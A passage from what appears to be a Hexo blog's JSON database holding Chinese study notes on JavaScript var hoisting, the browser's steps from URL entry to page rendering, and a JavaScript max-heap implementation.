class=\"comment\">// var 声明会存在变量提升</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;name&#x27;</span>, name);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;typeof name&#x27;</span>, <span class=\"keyword\">typeof</span> name);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> name === <span class=\"string\">&#x27;undefined&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> name = <span class=\"string\">&#x27;Jack&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;Goodbye &#x27;</span> + name);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;Hello &#x27;</span> + name);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ---- output -----</span></span><br><span class=\"line\"><span class=\"comment\">// name undefined</span></span><br><span class=\"line\"><span class=\"comment\">// typeof name undefined</span></span><br><span class=\"line\"><span class=\"comment\">// Goodbye Jack</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 说明： if 语句里的 var 声明没有块级作用域，会提升至函数的最上层</span></span><br></pre></td></tr></table></figure>"},{"_content":"","source":"_posts/Web 安全/JWT.md","raw":"","slug":"Web 安全/JWT","published":1,"date":"2021-04-30T08:57:41.918Z","updated":"2021-04-30T08:57:41.918Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cko5ke5k40000y06rbxmnguky","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"常见面试题","date":"2021-05-24T08:32:28.000Z","_content":"\n# 常见面试题\n\n## 从浏览器地址栏输入 url 到显示页面的步骤(以 HTTP 为例)\n\n1. 在浏览器地址栏输入 URL\n2. 浏览器查看**缓存**，如果请求资源在缓存中并且新鲜，跳转到转码步骤\n   1. 如果资源未缓存，发起新请求\n   2. 如果已缓存，检验是否足够新鲜，足够新鲜直接提供给客户端，否则与服务器进行验证。\n   3. 检验新鲜通常有两个 HTTP 头进行控制`Expires`和`Cache-Control`：\n      - HTTP1.0 提供 Expires，值为一个绝对时间表示缓存新鲜日期\n      - HTTP1.1 增加了 Cache-Control: max-age=,值为以秒为单位的最大新鲜时间\n3. 浏览器**解析 URL**获取协议，主机，端口，path\n4. 浏览器**组装一个 HTTP（GET）请求报文**\n5. 浏览器**获取主机 ip 地址**，过程如下：\n   1. 浏览器缓存\n   2. 本机缓存\n   3. hosts 文件\n   4. 路由器缓存\n   5. ISP DNS 缓存\n   6. DNS 递归查询（可能存在负载均衡导致每次 IP 不一样）\n6. **打开一个 socket 与目标 IP 地址，端口建立 TCP 链接**，三次握手如下：\n   1. 客户端发送一个 TCP 的**SYN=1，Seq=X**的包到服务器端口\n   2. 服务器发回**SYN=1， ACK=X+1， Seq=Y**的响应包\n   3. 客户端发送**ACK=Y+1， Seq=Z**\n7. TCP 链接建立后**发送 HTTP 请求**\n8. 服务器接受请求并解析，将请求转发到服务程序，如虚拟主机使用 HTTP Host 头部判断请求的服务程序\n9. 服务器检查**HTTP 请求头是否包含缓存验证信息**如果验证缓存新鲜，返回**304**等对应状态码\n10. 处理程序读取完整请求并准备 HTTP 响应，可能需要查询数据库等操作\n11. 服务器将**响应报文通过 TCP 连接发送回浏览器**\n12. 浏览器接收 HTTP 响应，然后根据情况选择**关闭 TCP 连接或者保留重用，关闭 TCP 连接的四次握手如下**：\n    1. 主动方发送**Fin=1， Ack=Z， Seq= X**报文\n    2. 被动方发送**ACK=X+1， Seq=Z**报文\n    3. 被动方发送**Fin=1， ACK=X， Seq=Y**报文\n    4. 主动方发送**ACK=Y， Seq=X**报文\n13. 浏览器检查响应状态吗：是否为 1XX，3XX， 4XX， 5XX，这些情况处理与 2XX 不同\n14. 如果资源可缓存，**进行缓存**\n15. 对响应进行**解码**（例如 gzip 压缩）\n16. 根据资源类型决定如何处理（假设资源为 HTML 文档）\n17. **解析 HTML 文档，构件 DOM 树，下载资源，构造 CSSOM 树，执行 js 脚本**，这些操作没有严格的先后顺序，以下分别解释\n18. **构建 DOM 树**：\n    1. **Tokenizing**：根据 HTML 规范将字符流解析为标记\n    2. **Lexing**：词法分析将标记转换为对象并定义属性和规则\n    3. **DOM construction**：根据 HTML 标记关系将对象组成 DOM 树\n19. 解析过程中遇到图片、样式表、js 文件，**启动下载**\n20. 构建**CSSOM 树**：\n    1. **Tokenizing**：字符流转换为标记流\n    2. **Node**：根据标记创建节点\n    3. **CSSOM**：节点创建 CSSOM 树\n21. **[根据 DOM 树和 CSSOM 树构建渲染树](https://developers.google.com/web/fundamentals/performance/critical-rendering-path/render-tree-construction)**:\n    1. 从 DOM 树的根节点遍历所有**可见节点**，不可见节点包括：1）`script`,`meta`这样本身不可见的标签。2)被 css 隐藏的节点，如`display: none`\n    2. 对每一个可见节点，找到恰当的 CSSOM 规则并应用\n    3. 发布可视节点的内容和计算样式\n22. **js 解析如下**：\n    1. 浏览器创建 Document 对象并解析 HTML，将解析到的元素和文本节点添加到文档中，此时**document.readystate 为 loading**\n    2. HTML 解析器遇到**没有 async 和 defer 的 script 时**，将他们添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且在脚本下载和执行时解析器会暂停。这样就可以用 document.write()把文本插入到输入流中。**同步脚本经常简单定义函数和注册事件处理程序，他们可以遍历和操作 script 和他们之前的文档内容**\n    3. 当解析器遇到设置了**async**属性的 script 时，开始下载脚本并继续解析文档。脚本会在它**下载完成后尽快执行**，但是**解析器不会停下来等它下载**。异步脚本**禁止使用 document.write()**，它们可以访问自己 script 和之前的文档元素\n    4. 当文档完成解析，document.readState 变成 interactive\n    5. 所有**defer**脚本会**按照在文档出现的顺序执行**，延迟脚本**能访问完整文档树**，禁止使用 document.write()\n    6. 浏览器**在 Document 对象上触发 DOMContentLoaded 事件**\n    7. 此时文档完全解析完成，浏览器可能还在等待如图片等内容加载，等这些**内容完成载入并且所有异步脚本完成载入和执行**，document.readState 变为 complete,window 触发 load 事件\n23. **显示页面**（HTML 解析过程中会逐步显示页面）\n\n","source":"_posts/HTML/常见面试题.md","raw":"---\ntitle: 常见面试题\ncategories: 面试题\ntags: [面试题]\ndate: 2021-05-24 16:32:28\n---\n\n# 常见面试题\n\n## 从浏览器地址栏输入 url 到显示页面的步骤(以 HTTP 为例)\n\n1. 在浏览器地址栏输入 URL\n2. 浏览器查看**缓存**，如果请求资源在缓存中并且新鲜，跳转到转码步骤\n   1. 如果资源未缓存，发起新请求\n   2. 如果已缓存，检验是否足够新鲜，足够新鲜直接提供给客户端，否则与服务器进行验证。\n   3. 检验新鲜通常有两个 HTTP 头进行控制`Expires`和`Cache-Control`：\n      - HTTP1.0 提供 Expires，值为一个绝对时间表示缓存新鲜日期\n      - HTTP1.1 增加了 Cache-Control: max-age=,值为以秒为单位的最大新鲜时间\n3. 浏览器**解析 URL**获取协议，主机，端口，path\n4. 浏览器**组装一个 HTTP（GET）请求报文**\n5. 浏览器**获取主机 ip 地址**，过程如下：\n   1. 浏览器缓存\n   2. 本机缓存\n   3. hosts 文件\n   4. 路由器缓存\n   5. ISP DNS 缓存\n   6. DNS 递归查询（可能存在负载均衡导致每次 IP 不一样）\n6. **打开一个 socket 与目标 IP 地址，端口建立 TCP 链接**，三次握手如下：\n   1. 客户端发送一个 TCP 的**SYN=1，Seq=X**的包到服务器端口\n   2. 服务器发回**SYN=1， ACK=X+1， Seq=Y**的响应包\n   3. 客户端发送**ACK=Y+1， Seq=Z**\n7. TCP 链接建立后**发送 HTTP 请求**\n8. 服务器接受请求并解析，将请求转发到服务程序，如虚拟主机使用 HTTP Host 头部判断请求的服务程序\n9. 服务器检查**HTTP 请求头是否包含缓存验证信息**如果验证缓存新鲜，返回**304**等对应状态码\n10. 处理程序读取完整请求并准备 HTTP 响应，可能需要查询数据库等操作\n11. 服务器将**响应报文通过 TCP 连接发送回浏览器**\n12. 浏览器接收 HTTP 响应，然后根据情况选择**关闭 TCP 连接或者保留重用，关闭 TCP 连接的四次握手如下**：\n    1. 主动方发送**Fin=1， Ack=Z， Seq= X**报文\n    2. 被动方发送**ACK=X+1， Seq=Z**报文\n    3. 被动方发送**Fin=1， ACK=X， Seq=Y**报文\n    4. 主动方发送**ACK=Y， Seq=X**报文\n13. 浏览器检查响应状态吗：是否为 1XX，3XX， 4XX， 5XX，这些情况处理与 2XX 不同\n14. 如果资源可缓存，**进行缓存**\n15. 对响应进行**解码**（例如 gzip 压缩）\n16. 根据资源类型决定如何处理（假设资源为 HTML 文档）\n17. **解析 HTML 文档，构件 DOM 树，下载资源，构造 CSSOM 树，执行 js 脚本**，这些操作没有严格的先后顺序，以下分别解释\n18. **构建 DOM 树**：\n    1. **Tokenizing**：根据 HTML 规范将字符流解析为标记\n    2. **Lexing**：词法分析将标记转换为对象并定义属性和规则\n    3. **DOM construction**：根据 HTML 标记关系将对象组成 DOM 树\n19. 解析过程中遇到图片、样式表、js 文件，**启动下载**\n20. 构建**CSSOM 树**：\n    1. **Tokenizing**：字符流转换为标记流\n    2. **Node**：根据标记创建节点\n    3. **CSSOM**：节点创建 CSSOM 树\n21. **[根据 DOM 树和 CSSOM 树构建渲染树](https://developers.google.com/web/fundamentals/performance/critical-rendering-path/render-tree-construction)**:\n    1. 从 DOM 树的根节点遍历所有**可见节点**，不可见节点包括：1）`script`,`meta`这样本身不可见的标签。2)被 css 隐藏的节点，如`display: none`\n    2. 对每一个可见节点，找到恰当的 CSSOM 规则并应用\n    3. 发布可视节点的内容和计算样式\n22. **js 解析如下**：\n    1. 浏览器创建 Document 对象并解析 HTML，将解析到的元素和文本节点添加到文档中，此时**document.readystate 为 loading**\n    2. HTML 解析器遇到**没有 async 和 defer 的 script 时**，将他们添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且在脚本下载和执行时解析器会暂停。这样就可以用 document.write()把文本插入到输入流中。**同步脚本经常简单定义函数和注册事件处理程序，他们可以遍历和操作 script 和他们之前的文档内容**\n    3. 当解析器遇到设置了**async**属性的 script 时，开始下载脚本并继续解析文档。脚本会在它**下载完成后尽快执行**，但是**解析器不会停下来等它下载**。异步脚本**禁止使用 document.write()**，它们可以访问自己 script 和之前的文档元素\n    4. 当文档完成解析，document.readState 变成 interactive\n    5. 所有**defer**脚本会**按照在文档出现的顺序执行**，延迟脚本**能访问完整文档树**，禁止使用 document.write()\n    6. 浏览器**在 Document 对象上触发 DOMContentLoaded 事件**\n    7. 此时文档完全解析完成，浏览器可能还在等待如图片等内容加载，等这些**内容完成载入并且所有异步脚本完成载入和执行**，document.readState 变为 complete,window 触发 load 事件\n23. **显示页面**（HTML 解析过程中会逐步显示页面）\n\n","slug":"HTML/常见面试题","published":1,"updated":"2021-06-07T11:38:47.555Z","_id":"cko8e8tci0000qf6r1ftcgmew","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"常见面试题\"><a href=\"#常见面试题\" class=\"headerlink\" title=\"常见面试题\"></a>常见面试题</h1><h2 id=\"从浏览器地址栏输入-url-到显示页面的步骤-以-HTTP-为例\"><a href=\"#从浏览器地址栏输入-url-到显示页面的步骤-以-HTTP-为例\" class=\"headerlink\" title=\"从浏览器地址栏输入 url 到显示页面的步骤(以 HTTP 为例)\"></a>从浏览器地址栏输入 url 到显示页面的步骤(以 HTTP 为例)</h2><ol>\n<li>在浏览器地址栏输入 URL</li>\n<li>浏览器查看<strong>缓存</strong>，如果请求资源在缓存中并且新鲜，跳转到转码步骤<ol>\n<li>如果资源未缓存，发起新请求</li>\n<li>如果已缓存，检验是否足够新鲜，足够新鲜直接提供给客户端，否则与服务器进行验证。</li>\n<li>检验新鲜通常有两个 HTTP 头进行控制<code>Expires</code>和<code>Cache-Control</code>：<ul>\n<li>HTTP1.0 提供 Expires，值为一个绝对时间表示缓存新鲜日期</li>\n<li>HTTP1.1 增加了 Cache-Control: max-age=,值为以秒为单位的最大新鲜时间</li>\n</ul>\n</li>\n</ol>\n</li>\n<li>浏览器<strong>解析 URL</strong>获取协议，主机，端口，path</li>\n<li>浏览器<strong>组装一个 HTTP（GET）请求报文</strong></li>\n<li>浏览器<strong>获取主机 ip 地址</strong>，过程如下：<ol>\n<li>浏览器缓存</li>\n<li>本机缓存</li>\n<li>hosts 文件</li>\n<li>路由器缓存</li>\n<li>ISP DNS 缓存</li>\n<li>DNS 递归查询（可能存在负载均衡导致每次 IP 不一样）</li>\n</ol>\n</li>\n<li><strong>打开一个 socket 与目标 IP 地址，端口建立 TCP 链接</strong>，三次握手如下：<ol>\n<li>客户端发送一个 TCP 的<strong>SYN=1，Seq=X</strong>的包到服务器端口</li>\n<li>服务器发回<strong>SYN=1， ACK=X+1， Seq=Y</strong>的响应包</li>\n<li>客户端发送<strong>ACK=Y+1， Seq=Z</strong></li>\n</ol>\n</li>\n<li>TCP 链接建立后<strong>发送 HTTP 请求</strong></li>\n<li>服务器接受请求并解析，将请求转发到服务程序，如虚拟主机使用 HTTP Host 头部判断请求的服务程序</li>\n<li>服务器检查<strong>HTTP 请求头是否包含缓存验证信息</strong>如果验证缓存新鲜，返回<strong>304</strong>等对应状态码</li>\n<li>处理程序读取完整请求并准备 HTTP 响应，可能需要查询数据库等操作</li>\n<li>服务器将<strong>响应报文通过 TCP 连接发送回浏览器</strong></li>\n<li>浏览器接收 HTTP 响应，然后根据情况选择<strong>关闭 TCP 连接或者保留重用，关闭 TCP 连接的四次握手如下</strong>：<ol>\n<li>主动方发送<strong>Fin=1， Ack=Z， Seq= X</strong>报文</li>\n<li>被动方发送<strong>ACK=X+1， Seq=Z</strong>报文</li>\n<li>被动方发送<strong>Fin=1， ACK=X， Seq=Y</strong>报文</li>\n<li>主动方发送<strong>ACK=Y， Seq=X</strong>报文</li>\n</ol>\n</li>\n<li>浏览器检查响应状态吗：是否为 1XX，3XX， 4XX， 5XX，这些情况处理与 2XX 不同</li>\n<li>如果资源可缓存，<strong>进行缓存</strong></li>\n<li>对响应进行<strong>解码</strong>（例如 gzip 压缩）</li>\n<li>根据资源类型决定如何处理（假设资源为 HTML 文档）</li>\n<li><strong>解析 HTML 文档，构件 DOM 树，下载资源，构造 CSSOM 树，执行 js 脚本</strong>，这些操作没有严格的先后顺序，以下分别解释</li>\n<li><strong>构建 DOM 树</strong>：<ol>\n<li><strong>Tokenizing</strong>：根据 HTML 规范将字符流解析为标记</li>\n<li><strong>Lexing</strong>：词法分析将标记转换为对象并定义属性和规则</li>\n<li><strong>DOM construction</strong>：根据 HTML 标记关系将对象组成 DOM 树</li>\n</ol>\n</li>\n<li>解析过程中遇到图片、样式表、js 文件，<strong>启动下载</strong></li>\n<li>构建<strong>CSSOM 树</strong>：<ol>\n<li><strong>Tokenizing</strong>：字符流转换为标记流</li>\n<li><strong>Node</strong>：根据标记创建节点</li>\n<li><strong>CSSOM</strong>：节点创建 CSSOM 树</li>\n</ol>\n</li>\n<li><strong><a href=\"https://developers.google.com/web/fundamentals/performance/critical-rendering-path/render-tree-construction\">根据 DOM 树和 CSSOM 树构建渲染树</a></strong>:<ol>\n<li>从 DOM 树的根节点遍历所有<strong>可见节点</strong>，不可见节点包括：1）<code>script</code>,<code>meta</code>这样本身不可见的标签。2)被 css 隐藏的节点，如<code>display: none</code></li>\n<li>对每一个可见节点，找到恰当的 CSSOM 规则并应用</li>\n<li>发布可视节点的内容和计算样式</li>\n</ol>\n</li>\n<li><strong>js 解析如下</strong>：<ol>\n<li>浏览器创建 Document 对象并解析 HTML，将解析到的元素和文本节点添加到文档中，此时<strong>document.readystate 为 loading</strong></li>\n<li>HTML 解析器遇到<strong>没有 async 和 defer 的 script 时</strong>，将他们添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且在脚本下载和执行时解析器会暂停。这样就可以用 document.write()把文本插入到输入流中。<strong>同步脚本经常简单定义函数和注册事件处理程序，他们可以遍历和操作 script 和他们之前的文档内容</strong></li>\n<li>当解析器遇到设置了<strong>async</strong>属性的 script 时，开始下载脚本并继续解析文档。脚本会在它<strong>下载完成后尽快执行</strong>，但是<strong>解析器不会停下来等它下载</strong>。异步脚本**禁止使用 document.write()**，它们可以访问自己 script 和之前的文档元素</li>\n<li>当文档完成解析，document.readState 变成 interactive</li>\n<li>所有<strong>defer</strong>脚本会<strong>按照在文档出现的顺序执行</strong>，延迟脚本<strong>能访问完整文档树</strong>，禁止使用 document.write()</li>\n<li>浏览器<strong>在 Document 对象上触发 DOMContentLoaded 事件</strong></li>\n<li>此时文档完全解析完成，浏览器可能还在等待如图片等内容加载，等这些<strong>内容完成载入并且所有异步脚本完成载入和执行</strong>，document.readState 变为 complete,window 触发 load 事件</li>\n</ol>\n</li>\n<li><strong>显示页面</strong>（HTML 解析过程中会逐步显示页面）</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"常见面试题\"><a href=\"#常见面试题\" class=\"headerlink\" title=\"常见面试题\"></a>常见面试题</h1><h2 id=\"从浏览器地址栏输入-url-到显示页面的步骤-以-HTTP-为例\"><a href=\"#从浏览器地址栏输入-url-到显示页面的步骤-以-HTTP-为例\" class=\"headerlink\" title=\"从浏览器地址栏输入 url 到显示页面的步骤(以 HTTP 为例)\"></a>从浏览器地址栏输入 url 到显示页面的步骤(以 HTTP 为例)</h2><ol>\n<li>在浏览器地址栏输入 URL</li>\n<li>浏览器查看<strong>缓存</strong>，如果请求资源在缓存中并且新鲜，跳转到转码步骤<ol>\n<li>如果资源未缓存，发起新请求</li>\n<li>如果已缓存，检验是否足够新鲜，足够新鲜直接提供给客户端，否则与服务器进行验证。</li>\n<li>检验新鲜通常有两个 HTTP 头进行控制<code>Expires</code>和<code>Cache-Control</code>：<ul>\n<li>HTTP1.0 提供 Expires，值为一个绝对时间表示缓存新鲜日期</li>\n<li>HTTP1.1 增加了 Cache-Control: max-age=,值为以秒为单位的最大新鲜时间</li>\n</ul>\n</li>\n</ol>\n</li>\n<li>浏览器<strong>解析 URL</strong>获取协议，主机，端口，path</li>\n<li>浏览器<strong>组装一个 HTTP（GET）请求报文</strong></li>\n<li>浏览器<strong>获取主机 ip 地址</strong>，过程如下：<ol>\n<li>浏览器缓存</li>\n<li>本机缓存</li>\n<li>hosts 文件</li>\n<li>路由器缓存</li>\n<li>ISP DNS 缓存</li>\n<li>DNS 递归查询（可能存在负载均衡导致每次 IP 不一样）</li>\n</ol>\n</li>\n<li><strong>打开一个 socket 与目标 IP 地址，端口建立 TCP 链接</strong>，三次握手如下：<ol>\n<li>客户端发送一个 TCP 的<strong>SYN=1，Seq=X</strong>的包到服务器端口</li>\n<li>服务器发回<strong>SYN=1， ACK=X+1， Seq=Y</strong>的响应包</li>\n<li>客户端发送<strong>ACK=Y+1， Seq=Z</strong></li>\n</ol>\n</li>\n<li>TCP 链接建立后<strong>发送 HTTP 请求</strong></li>\n<li>服务器接受请求并解析，将请求转发到服务程序，如虚拟主机使用 HTTP Host 头部判断请求的服务程序</li>\n<li>服务器检查<strong>HTTP 请求头是否包含缓存验证信息</strong>如果验证缓存新鲜，返回<strong>304</strong>等对应状态码</li>\n<li>处理程序读取完整请求并准备 HTTP 响应，可能需要查询数据库等操作</li>\n<li>服务器将<strong>响应报文通过 TCP 连接发送回浏览器</strong></li>\n<li>浏览器接收 HTTP 响应，然后根据情况选择<strong>关闭 TCP 连接或者保留重用，关闭 TCP 连接的四次握手如下</strong>：<ol>\n<li>主动方发送<strong>Fin=1， Ack=Z， Seq= X</strong>报文</li>\n<li>被动方发送<strong>ACK=X+1， Seq=Z</strong>报文</li>\n<li>被动方发送<strong>Fin=1， ACK=X， Seq=Y</strong>报文</li>\n<li>主动方发送<strong>ACK=Y， Seq=X</strong>报文</li>\n</ol>\n</li>\n<li>浏览器检查响应状态吗：是否为 1XX，3XX， 4XX， 5XX，这些情况处理与 2XX 不同</li>\n<li>如果资源可缓存，<strong>进行缓存</strong></li>\n<li>对响应进行<strong>解码</strong>（例如 gzip 压缩）</li>\n<li>根据资源类型决定如何处理（假设资源为 HTML 文档）</li>\n<li><strong>解析 HTML 文档，构件 DOM 树，下载资源，构造 CSSOM 树，执行 js 脚本</strong>，这些操作没有严格的先后顺序，以下分别解释</li>\n<li><strong>构建 DOM 树</strong>：<ol>\n<li><strong>Tokenizing</strong>：根据 HTML 规范将字符流解析为标记</li>\n<li><strong>Lexing</strong>：词法分析将标记转换为对象并定义属性和规则</li>\n<li><strong>DOM construction</strong>：根据 HTML 标记关系将对象组成 DOM 树</li>\n</ol>\n</li>\n<li>解析过程中遇到图片、样式表、js 文件，<strong>启动下载</strong></li>\n<li>构建<strong>CSSOM 树</strong>：<ol>\n<li><strong>Tokenizing</strong>：字符流转换为标记流</li>\n<li><strong>Node</strong>：根据标记创建节点</li>\n<li><strong>CSSOM</strong>：节点创建 CSSOM 树</li>\n</ol>\n</li>\n<li><strong><a href=\"https://developers.google.com/web/fundamentals/performance/critical-rendering-path/render-tree-construction\">根据 DOM 树和 CSSOM 树构建渲染树</a></strong>:<ol>\n<li>从 DOM 树的根节点遍历所有<strong>可见节点</strong>，不可见节点包括：1）<code>script</code>,<code>meta</code>这样本身不可见的标签。2)被 css 隐藏的节点，如<code>display: none</code></li>\n<li>对每一个可见节点，找到恰当的 CSSOM 规则并应用</li>\n<li>发布可视节点的内容和计算样式</li>\n</ol>\n</li>\n<li><strong>js 解析如下</strong>：<ol>\n<li>浏览器创建 Document 对象并解析 HTML，将解析到的元素和文本节点添加到文档中，此时<strong>document.readystate 为 loading</strong></li>\n<li>HTML 解析器遇到<strong>没有 async 和 defer 的 script 时</strong>，将他们添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且在脚本下载和执行时解析器会暂停。这样就可以用 document.write()把文本插入到输入流中。<strong>同步脚本经常简单定义函数和注册事件处理程序，他们可以遍历和操作 script 和他们之前的文档内容</strong></li>\n<li>当解析器遇到设置了<strong>async</strong>属性的 script 时，开始下载脚本并继续解析文档。脚本会在它<strong>下载完成后尽快执行</strong>，但是<strong>解析器不会停下来等它下载</strong>。异步脚本**禁止使用 document.write()**，它们可以访问自己 script 和之前的文档元素</li>\n<li>当文档完成解析，document.readState 变成 interactive</li>\n<li>所有<strong>defer</strong>脚本会<strong>按照在文档出现的顺序执行</strong>，延迟脚本<strong>能访问完整文档树</strong>，禁止使用 document.write()</li>\n<li>浏览器<strong>在 Document 对象上触发 DOMContentLoaded 事件</strong></li>\n<li>此时文档完全解析完成，浏览器可能还在等待如图片等内容加载，等这些<strong>内容完成载入并且所有异步脚本完成载入和执行</strong>，document.readState 变为 complete,window 触发 load 事件</li>\n</ol>\n</li>\n<li><strong>显示页面</strong>（HTML 解析过程中会逐步显示页面）</li>\n</ol>\n"},{"title":"堆","date":"2020-11-14T07:48:00.000Z","_content":"\n# 堆\n\n### 概念\n堆通常是一个可以被看做一棵树的数组对象，堆的实现通过构造**二叉堆**，为二叉树的一种。\n\n逻辑结构为二叉树，存储结构为数组\n\n![二叉树](/images/binary-tree.png)\n\n### 性质\n* 任意节点小于（或大于）它的所有子节点\n* 堆总是一棵完全树。即除了最底层，其他层的节点都被元素填满，且最底层从左到右填入。\n* 将根节点最大的堆叫做最大堆或大根堆，根节点最小的堆叫做最小堆或小根堆。\n\n其中**每个结点**的值都不大于其孩子结点的值，这样的堆称为**小根堆**。\n其中**每个结点**的值都不小于其孩子结点的值，这样的堆称为**大根堆**。\n\n> 优先队列也完全可以用堆来实现，操作是一模一样的，例如最大优先队列，无论入队顺序，当前最大的元素优先出队。\n\n> 堆的根节点中存放的是最大或者最小元素，但是其他节点的排序顺序是未知的。例如，在一个最大堆中，最大的那一个元素总是位于 index 0 的位置，但是最小的元素则未必是最后一个元素。唯一能够保证的是最小的元素是一个叶节点，但是不确定是哪一个。\n\n### 作用\n* 构建优先队列\n* 堆排序\n* 快速找出最大/最小值\n\n### 实现大根堆\n堆的每个节点的左边子节点索引是 `i * 2 + 1`，右边是 `i * 2 + 2`，父节点是 `(i - 1) /2`。\n\n堆有两个核心的操作，分别是 `shiftUp` 和 `shiftDown`。\n* `shiftUp`：添加元素，核心思路是一路将节点与父节点对比大小，如果比父节点大，就和父节点交换位置。\n* `shiftDown`：删除根节点，核心思路是先将根节点和末尾交换位置，然后移除末尾元素。接下来循环判断父节点和两个子节点的大小，如果子节点大，就把最大的子节点和父节点交换。\n\n```js\nclass MaxHeap {\n  constructor() {\n    this.heap = []\n  }\n  size() {\n    return this.heap.length\n  }\n  empty() {\n    return this.size() == 0\n  }\n  add(item) {\n    this.heap.push(item)\n    this._shiftUp(this.size() - 1)\n  }\n  removeMax() {\n    this._shiftDown(0)\n  }\n  getParentIndex(k) {\n    return parseInt((k - 1) / 2)\n  }\n  getLeftIndex(k) {\n    return k * 2 + 1\n  }\n  _shiftUp(k) {\n    // 如果当前节点比父节点大，就交换\n    while (this.heap[k] > this.heap[this.getParentIndex(k)]) {\n      this._swap(k, this.getParentIndex(k))\n      // 将索引变成父节点\n      k = this.getParentIndex(k)\n    }\n  }\n  _shiftDown(k) {\n    // 交换首位并删除末尾\n    this._swap(k, this.size() - 1)\n    this.heap.splice(this.size() - 1, 1)\n    // 判断节点是否有左孩子，因为二叉堆的特性，有右必有左\n    while (this.getLeftIndex(k) < this.size()) {\n      let j = this.getLeftIndex(k)\n      // 判断是否有右孩子，并且右孩子是否大于左孩子\n      if (j + 1 < this.size() && this.heap[j + 1] > this.heap[j]) j++\n      // 判断父节点是否已经比子节点都大\n      if (this.heap[k] >= this.heap[j]) break\n      this._swap(k, j)\n      k = j\n    }\n  }\n  _swap(left, right) {\n    let rightValue = this.heap[right]\n    this.heap[right] = this.heap[left]\n    this.heap[left] = rightValue\n  }\n}\n```","source":"_posts/数据结构/数据结构-堆(非线性结构).md","raw":"---\ntitle: 堆\ncategories: 数据结构\ntags: [数据结构]\ndate: 2020-11-14 15:48:00\n---\n\n# 堆\n\n### 概念\n堆通常是一个可以被看做一棵树的数组对象，堆的实现通过构造**二叉堆**，为二叉树的一种。\n\n逻辑结构为二叉树，存储结构为数组\n\n![二叉树](/images/binary-tree.png)\n\n### 性质\n* 任意节点小于（或大于）它的所有子节点\n* 堆总是一棵完全树。即除了最底层，其他层的节点都被元素填满，且最底层从左到右填入。\n* 将根节点最大的堆叫做最大堆或大根堆，根节点最小的堆叫做最小堆或小根堆。\n\n其中**每个结点**的值都不大于其孩子结点的值，这样的堆称为**小根堆**。\n其中**每个结点**的值都不小于其孩子结点的值，这样的堆称为**大根堆**。\n\n> 优先队列也完全可以用堆来实现，操作是一模一样的，例如最大优先队列，无论入队顺序，当前最大的元素优先出队。\n\n> 堆的根节点中存放的是最大或者最小元素，但是其他节点的排序顺序是未知的。例如，在一个最大堆中，最大的那一个元素总是位于 index 0 的位置，但是最小的元素则未必是最后一个元素。唯一能够保证的是最小的元素是一个叶节点，但是不确定是哪一个。\n\n### 作用\n* 构建优先队列\n* 堆排序\n* 快速找出最大/最小值\n\n### 实现大根堆\n堆的每个节点的左边子节点索引是 `i * 2 + 1`，右边是 `i * 2 + 2`，父节点是 `(i - 1) /2`。\n\n堆有两个核心的操作，分别是 `shiftUp` 和 `shiftDown`。\n* `shiftUp`：添加元素，核心思路是一路将节点与父节点对比大小，如果比父节点大，就和父节点交换位置。\n* `shiftDown`：删除根节点，核心思路是先将根节点和末尾交换位置，然后移除末尾元素。接下来循环判断父节点和两个子节点的大小，如果子节点大，就把最大的子节点和父节点交换。\n\n```js\nclass MaxHeap {\n  constructor() {\n    this.heap = []\n  }\n  size() {\n    return this.heap.length\n  }\n  empty() {\n    return this.size() == 0\n  }\n  add(item) {\n    this.heap.push(item)\n    this._shiftUp(this.size() - 1)\n  }\n  removeMax() {\n    this._shiftDown(0)\n  }\n  getParentIndex(k) {\n    return parseInt((k - 1) / 2)\n  }\n  getLeftIndex(k) {\n    return k * 2 + 1\n  }\n  _shiftUp(k) {\n    // 如果当前节点比父节点大，就交换\n    while (this.heap[k] > this.heap[this.getParentIndex(k)]) {\n      this._swap(k, this.getParentIndex(k))\n      // 将索引变成父节点\n      k = this.getParentIndex(k)\n    }\n  }\n  _shiftDown(k) {\n    // 交换首位并删除末尾\n    this._swap(k, this.size() - 1)\n    this.heap.splice(this.size() - 1, 1)\n    // 判断节点是否有左孩子，因为二叉堆的特性，有右必有左\n    while (this.getLeftIndex(k) < this.size()) {\n      let j = this.getLeftIndex(k)\n      // 判断是否有右孩子，并且右孩子是否大于左孩子\n      if (j + 1 < this.size() && this.heap[j + 1] > this.heap[j]) j++\n      // 判断父节点是否已经比子节点都大\n      if (this.heap[k] >= this.heap[j]) break\n      this._swap(k, j)\n      k = j\n    }\n  }\n  _swap(left, right) {\n    let rightValue = this.heap[right]\n    this.heap[right] = this.heap[left]\n    this.heap[left] = rightValue\n  }\n}\n```","slug":"数据结构/数据结构-堆(非线性结构)","published":1,"updated":"2021-05-03T09:23:25.567Z","_id":"cko8e8tcm0001qf6rdq4cc2sf","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"堆\"><a href=\"#堆\" class=\"headerlink\" title=\"堆\"></a>堆</h1><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>堆通常是一个可以被看做一棵树的数组对象，堆的实现通过构造<strong>二叉堆</strong>，为二叉树的一种。</p>\n<p>逻辑结构为二叉树，存储结构为数组</p>\n<p><img src=\"/images/binary-tree.png\" 